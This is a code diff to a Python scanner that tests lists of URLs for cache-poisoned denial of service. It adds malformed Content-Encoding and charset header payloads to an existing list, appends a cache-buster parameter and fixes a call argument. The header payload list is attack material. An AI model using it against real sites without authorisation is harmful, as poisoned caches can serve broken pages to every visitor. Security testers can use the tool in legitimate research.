@@ -77,16 +77,15 @@ def check_cached_len(url, s, pk, main_len, authent):
         elif behavior:
             print(f"\033[33m └── [INTERESTING BEHAVIOR]\033[0m | CPDoSError {main_len}b > {len(req.content)}b | CACHE : {cache_status} | \033[34m{url}\033[0m | PAYLOAD: {pk}")
     except Exception as e:
-        pass
         #print(f"Error : {e}")
-
+        pass
 
 def get_error(url, s, main_status_code, main_len, authent):
 
     payload_keys = [
     {"xyz": "1"},
     {"(": "1"},
-    {":/": "\\:\\"},
+    {"/": "\\:\\"},
     {"x-timer": "x"*500},
     {"X-Timer": "5000"},
     {"X-Requested-With": "SomeValue"},
@@ -170,6 +169,14 @@ def get_error(url, s, main_status_code, main_len, authent):
     {"Rsc": "1"},
     {"Rsc": "xxx"},
     {"x-middleware-prefetch": "1"},
+    {"Content-Encoding": "toto"},
+    {"Content-Type": "text/html; charset=utf-16"},
+    {"Content-Type": "text/html; charset=utf-32"},
+    {"Content-Type": "text/html; charset=invalid-charset"},
+    {"Content-Type": "text/html; charset=invalid-charset", "Content-Encoding": "toto"},
+    {"Content-Type": "application/json", "Content-Encoding": "gzip"},
+    {"Content-Type": "application/octet-stream", "Content-Encoding": "deflate"},
+    {"Content-Encoding": "gzip, deflate"}
     ]
 
     blocked = 0
@@ -194,7 +201,7 @@ def get_error(url, s, main_status_code, main_len, authent):
             elif blocked < 3 and req.status_code == 200:
                 if len(str(main_len)) <= 5 and main_len not in range(len_req - 1000, len_req + 1000):
                     check_cached_len(uri, s, pk, main_len, authent)
-                elif len(str(main_len)) > 5 and main_len not in range(len_req - 5000, len_req + 5000):
+                elif len(str(main_len)) > 5 and main_len not in range(len_req - 10000, len_req + 10000):
                     check_cached_len(uri, s, pk, main_len, authent)
         except requests.Timeout:
             #print(f"request timeout {url} {p}")
@@ -215,12 +222,13 @@ if __name__ == '__main__':
     with open(url_file, "r") as urls:
         urls = urls.read().splitlines()
         for url in urls:
+            url = f"{url}?cb="
             try:
                 req_main = requests.get(url, verify=False, timeout=10, allow_redirects=False)
                 main_len = len(req_main.content)
                 main_status_code = req_main.status_code
                 authent = False
-                get_error(url, s, main_status_code, authent)
+                get_error(url, s, main_status_code, main_len, authent)
             except KeyboardInterrupt:
                 print("Exiting")
                 sys.exit()
